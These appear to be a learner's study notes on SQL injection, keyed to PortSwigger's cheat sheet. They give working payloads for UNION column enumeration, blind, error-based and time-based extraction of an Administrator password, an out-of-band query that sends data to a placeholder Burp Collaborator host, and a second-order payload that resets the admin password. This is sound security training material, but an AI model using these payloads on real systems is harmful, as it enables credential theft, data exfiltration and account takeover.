Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

(the syntax below might be different for different databases so pls refer to the cheatsheet!)

Detection: Send `'` and it causes internal server error or other error. (If it gets encoded by the frontend send non-encoded version again in Burp to ensure.). This is bcos SQL uses `'` for string delimiters, so inside the SQL query most of the time it would be `SELECT * WHERE name='<user input>'`.

Concatenating: You can concatenate multiple columns using `||`. Eg `' UNION SELECT username || '~' || password FROM users--`

## UNION attacks
Vuln query is `SELECT a, b FROM table1` allowing u to do `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

### How to determine number of columns

1. ORDER BY: try each payload until an error is returned
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

2. NULL,NULL,NULL: try each payload until no error
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

### How to determine columns with useful data types
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
until no error occurs

### Oracle (FROM dual)
For Oracle, every SELECT has to be paired with a FROM, so you probably have to do `' FROM dual ORDER BY 1--` or `' FROM dual UNION SELECT NULL FROM DUAL--`

## Blind SQLi
When SQL data is not returned in plaintext but instead returns conditional responses based on SQL response.

Check if it is vulnerable to blind SQLi:
```sql
xyz' AND 1=0--
xyz' AND 1=1--
```
and check for differences in response

Narrow down specific fields using binary search (SUBSTRING is called SUBSTR on some databases, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)):
```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
until u find the exact value of that field.

## Error-based SQLi (inducing an error if there is not even a conditional response)
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
(SUBSTRING is called SUBSTR on some databases, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)) and use binary search same as Blind SQLi

## Time-based SQLi
`' AND IF(Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm', SLEEP(5), 0)--` (for MySQL, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for others)

## Out-of-band
`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` (for MySQL, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for others)

## Second-order SQLi
Putting SQLi in your username that is not sanitized properly then being trusted and executed as an SQLi query.

Eg: Setting your username as "a'; UPDATE users SET password='admin' WHERE user='admin'--"